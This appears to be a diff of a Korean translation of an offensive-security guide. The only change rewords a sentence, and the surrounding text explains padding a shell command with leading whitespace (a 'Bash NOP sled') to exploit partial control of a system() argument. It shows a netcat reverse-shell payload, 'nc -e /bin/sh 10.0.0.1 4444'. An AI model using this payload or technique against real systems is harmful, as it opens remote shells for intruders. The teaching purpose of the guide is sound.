@@ -312,7 +312,7 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 취약점이 `system()` 또는 다른 셸에 도달하는 인수를 부분적으로 제어할 수 있게 해줄 때, 실행이 페이로드를 읽기 시작하는 정확한 오프셋을 알지 못할 수 있습니다. 전통적인 NOP 슬레드(예: `\x90`)는 셸 구문에서 **작동하지 않지만**, Bash는 명령을 실행하기 전에 선행 공백을 무해하게 무시합니다.
 
-따라서 실제 명령 앞에 긴 공백 또는 탭 문자의 시퀀스를 추가하여 *Bash용 NOP 슬레드*를 만들 수 있습니다:
+따라서 실제 명령 앞에 긴 공백 또는 탭 문자의 시퀀스를 접두사로 추가하여 *Bash용 NOP 슬레드*를 만들 수 있습니다:
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
